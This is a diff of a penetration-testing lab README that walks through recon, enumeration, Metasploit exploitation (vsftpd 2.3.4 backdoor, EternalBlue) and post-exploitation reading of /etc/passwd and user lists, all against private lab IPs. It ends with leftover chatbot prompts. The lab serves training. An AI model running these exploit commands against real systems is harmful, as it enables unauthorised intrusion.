@@ -3,41 +3,46 @@
 <p align="center">
   <img src="https://img.shields.io/badge/Lab-Environment-blue?style=for-the-badge" />
   <img src="https://img.shields.io/badge/Tools-Kali%20Linux-green?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Target-Metasploitable-red?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/Targets-Metasploitable%20%26%20Windows-red?style=for-the-badge" />
 </p>
 
 ---
 
 ## 🔹 Lab Overview
 
-This lab is designed for **ethical hackers, penetration testers, and cybersecurity enthusiasts** to practice real-world penetration testing in a **safe and isolated network**.  
+This guide is designed for **ethical hackers and cybersecurity enthusiasts** to practice penetration testing in a **safe, isolated, and realistic environment**.
 
 **Lab Components:**
 
-| Machine | OS | IP Address | Role |
-|---------|----|------------|------|
-| Attacker | Kali Linux | 192.168.142.128 | Pentester machine |
-| Target | Metasploitable 2 | 192.168.142.130 | Vulnerable machine for testing |
+| Machine   | OS               | IP Address       | Role                         |
+|-----------|-----------------|----------------|------------------------------|
+| Attacker  | Kali Linux       | 192.168.142.128 | Pentester machine            |
+| Target 1 | Metasploitable 2 | 192.168.142.130 | Vulnerable Linux machine     |
+| Target 2 | Windows 10/Server| 192.168.142.132 | Vulnerable Windows machine   |
 
-**Objective:**  
-- Perform reconnaissance, scanning, enumeration, exploitation, and post-exploitation in a controlled environment.  
+**Objectives:**  
+- Perform reconnaissance, scanning, enumeration, exploitation, and post-exploitation.
+- Practice both Linux and Windows target exploitation in a controlled environment.
+- Build a detailed report of findings.
 
 ---
 
 ## 🔹 Lab Setup
 
-### 1. Environment Requirements
+### 1. Requirements
 - Virtualization software: **VirtualBox** or **VMware**
-- Kali Linux ISO or VM image
+- Kali Linux VM
 - Metasploitable 2 VM
+- Windows VM (10/Server)
 - Internal network setup for isolation
-- Snapshots before starting tests
+- Snapshots before testing
 
 ### 2. Network Configuration
-1. Set both VMs to **Host-Only Adapter** or **Internal Network**.
-2. Verify connectivity:
+1. Set all VMs to **Host-Only Adapter** or **Internal Network**.
+2. Confirm connectivity between machines:
 ```bash
 ping 192.168.142.130
+ping 192.168.142.132
 ````
 
 ---
@@ -48,38 +53,43 @@ ping 192.168.142.130
 
 #### Passive Recon
 
-* Gather information without directly interacting with the target.
+* Gather info without directly contacting the target:
 
 ```bash
 whois 192.168.142.130
-nslookup 192.168.142.130
+whois 192.168.142.132
+nslookup 192.168.142.132
 ```
 
 #### Active Recon
 
-* Use **nmap** for port scanning:
+* Scan for open ports and services with **Nmap**:
 
 ```bash
 nmap -sS -Pn 192.168.142.130
+nmap -sS -Pn 192.168.142.132
 ```
 
-* Scan all ports and services:
+* Detailed scanning with service detection:
 
 ```bash
-nmap -p- -A -T4 192.168.142.130
+nmap -A -p- 192.168.142.130
+nmap -A -p- 192.168.142.132
 ```
 
 ---
 
 ### Step 2: Enumeration
 
-* Identify running services and versions:
+#### Linux Target
+
+* Identify services and versions:
 
 ```bash
 nmap -sV -p 21,22,23,80,139,445,3306 192.168.142.130
 ```
 
-* FTP banner grabbing:
+* FTP Banner grabbing:
 
 ```bash
 nc 192.168.142.130 21
@@ -89,24 +99,41 @@ nc 192.168.142.130 21
 
 ```bash
 smbclient -L \\192.168.142.130 -U guest
+enum4linux 192.168.142.130
+```
+
+#### Windows Target
+
+* SMB enumeration:
+
+```bash
+smbclient -L \\192.168.142.132 -U Administrator
+```
+
+* RDP/SMB service detection:
+
+```bash
+nmap -p 3389,445 -sV 192.168.142.132
 ```
 
 ---
 
 ### Step 3: Vulnerability Analysis
 
-* Identify known vulnerabilities:
+* Use **Searchsploit** to find known exploits:
 
 ```bash
 searchsploit vsftpd 2.3.4
+searchsploit ms17-010
 ```
 
-* Check open ports for exploits using **Metasploit**:
+* Metasploit module usage example:
 
 ```bash
 msfconsole
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOST 192.168.142.130
+search ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.142.132
 run
 ```
 
@@ -114,13 +141,27 @@ run
 
 ### Step 4: Exploitation
 
-* Exploit vulnerable services (FTP, SMB, Telnet):
+#### Linux Target
+
+* Exploit FTP vulnerability:
 
 ```bash
-exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.142.130
+run
 ```
 
-* Gain shell access and check privileges:
+#### Windows Target
+
+* Exploit SMB vulnerability:
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.142.132
+run
+```
+
+* Gain shell access:
 
 ```bash
 whoami
@@ -131,47 +172,54 @@ id
 
 ### Step 5: Post-Exploitation
 
-* Enumerate system information:
+* Linux target:
 
 ```bash
 uname -a
 cat /etc/passwd
 ifconfig
-```
-
-* Check for privilege escalation opportunities:
-
-```bash
 sudo -l
 ```
+
+* Windows target:
+
+```powershell
+systeminfo
+net user
+whoami /priv
+```
+
+* Extract sensitive information or pivot to other machines (in lab only).
 
 ---
 
 ### Step 6: Reporting
 
-* Document findings:
+Document all findings with screenshots, PoCs, and mitigation steps.
 
-  * Vulnerable services
-  * Exploits used
-  * Proof of concept screenshots
-  * Suggested mitigation
+**Sample Table:**
 
-**Template:**
-
-| Vulnerability | Exploit Used  | Impact              | Mitigation                                   |
-| ------------- | ------------- | ------------------- | -------------------------------------------- |
-| FTP Backdoor  | vsftpd\_2.3.4 | Remote Shell Access | Upgrade FTP server / Disable anonymous login |
+| Vulnerability | Exploit Used  | Impact                | Mitigation                      |
+| ------------- | ------------- | --------------------- | ------------------------------- |
+| FTP Backdoor  | vsftpd\_2.3.4 | Remote Shell Access   | Upgrade FTP / Disable anonymous |
+| SMB MS17-010  | EternalBlue   | Remote Code Execution | Apply Windows Update / Patch    |
 
 ---
 
 ## 🔹 Recommended Tools
 
-* Nmap / Zenmap
-* Netcat
-* Metasploit Framework
-* Nikto / Dirb
-* Wireshark
-* Enum4linux / smbclient
+* **Kali Linux Tools:** Nmap, Netcat, Metasploit, Enum4linux, Nikto, Dirb
+* **Windows Testing Tools:** PowerShell, CrackMapExec, SMBMap
+* **Analysis Tools:** Wireshark, Burp Suite
+
+---
+
+## 🔹 Best Practices
+
+* Always take VM snapshots before testing.
+* Keep the lab **isolated from the internet**.
+* Use only lab IP addresses to avoid accidental attacks.
+* Document every step carefully for reporting.
 
 ---
 
@@ -179,14 +227,19 @@ sudo -l
 
 * [Metasploitable 2 VM](https://sourceforge.net/projects/metasploitable/)
 * [Kali Linux Tools](https://www.kali.org/tools/)
+* [MS17-010 EternalBlue](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
 * [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
 
 ---
 
 > ⚠️ **Disclaimer:**
-> This lab is for educational purposes only. Do **NOT** perform penetration testing on networks or systems without explicit permission. Unauthorized testing is illegal and unethical.
+> This lab is for **educational purposes only**. Do **NOT** perform penetration testing on unauthorized networks. Unauthorized testing is illegal and unethical.
 
 ```
 
-Do you want me to do that?
+---
+
+If you want, I can also **add rich visuals, diagrams, folder structures, and GitHub badges for tools, OS, and steps**—so it becomes a **full professional lab README.md** ready to impress on GitHub.  
+
+Do you want me to enhance it with visuals and structure?
 ```
